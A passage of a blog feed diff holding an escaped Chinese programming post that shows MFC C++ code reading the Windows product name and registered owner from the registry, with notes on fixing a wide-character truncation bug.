-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CRegDataDlg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OnClickedQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;// TODO: Add your control notification handler code here
-&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//--------------------------------查询系统版本信息--------------------------
-&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//查询ProductName
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cdData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//预设置的数据长度
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;LPDWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cdData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;LPBYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProductName_Get&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//保存查询的数据
-&lt;/span&gt;	&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RegGetValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Software&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Windows NT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;CurrentVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ProductName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RRF_RT_REG_SZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProductName_Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//注册表查询，将结果保存在ProductName_Get中
-&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;//将unicode转换为ASCII
-&lt;/span&gt;	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProductName_Get_Buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dBufSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;WideCharToMultiByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CP_UTF8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCWCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProductName_Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProductName_Get_Buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dBufSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//转换后的结果保存在ProductName_Get_Buf中
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;m_ProductName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProductName_Get_Buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//显示在界面上
-&lt;/span&gt;    
-        &lt;span class=&quot;n&quot;&gt;UpdateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//将值赋给控件
-&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProductName_Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;如果使用&lt;code class=&quot;highlighter-rouge&quot;&gt;RegQueryValueEx&lt;/code&gt;进行查询，则需要先使用&lt;code class=&quot;highlighter-rouge&quot;&gt;RegOpenKeyEx&lt;/code&gt;打开注册表：&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CRegDataDlg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OnClickedQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;HKEY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hKEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//handler
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;LPCTSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;banner_Set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Software&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Windows NT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;CurrentVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//子健目录
-&lt;/span&gt;	&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retopen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RegOpenKeyEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;banner_Set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hKEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//打开系统版本注册表
-&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retopen&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERROR_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;MessageBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ERROR:Can not open the hKEY!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-        &lt;span class=&quot;c1&quot;&gt;//查询RegisteredOwner
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;LPBYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RegisteredOwner_Get&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;REG_SZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cdData_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RegQueryValueEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hKEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RegisteredOwner&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RegisteredOwner_Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cdData_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERROR_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;MessageBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Can not query the Reg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dBuf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dBufSize2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;WideCharToMultiByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CP_UTF8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCWCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RegisteredOwner_Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dBuf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dBufSize2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;m_RegisteredOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dBuf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RegisteredOwner_Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RegCloseKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hKEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h3 id=&quot;宽字节转换&quot;&gt;宽字节转换&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;`WideCharToMultiByte`:此函数是将宽字节转换为ascii，刚好在《加密与解密》这本书的第一章看到过，与此对应的是`MultiByteToWideChar`
-
-`ASCII`：7位，1 byte。
-
-`Unicode`：16位，2 byte，所以称为宽字节，将7位的ASCII扩充为16位(0来填充)。
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;书上的源码没有使用这个函数进行转换，所以导致我的输出只有字符串的第一个字符，例如本来应该输出&lt;code class=&quot;highlighter-rouge&quot;&gt;Windows 10 Enterprise 2015 LTSB&lt;/code&gt;,但只输出了&lt;code class=&quot;highlighter-rouge&quot;&gt;W&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;后来经彬彬大神的点拨，让我对&lt;code class=&quot;highlighter-rouge&quot;&gt;ProductName_Get&lt;/code&gt;的字符串进行逐个输出，然后看到了&lt;code class=&quot;highlighter-rouge&quot;&gt;\0&lt;/code&gt;的bug。&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;putchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProductName_Get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;可以看到，ProductName_Get[0]=’W’,ProductName_Get[1]=’\0’,直接把字符串截断了&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/09/MFCRegData//6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Wed, 20 Sep 2017 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2017/09/MFCRegData/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/09/MFCRegData/</guid>
-        
-        <category>Coding</category>
         
         
       </item>
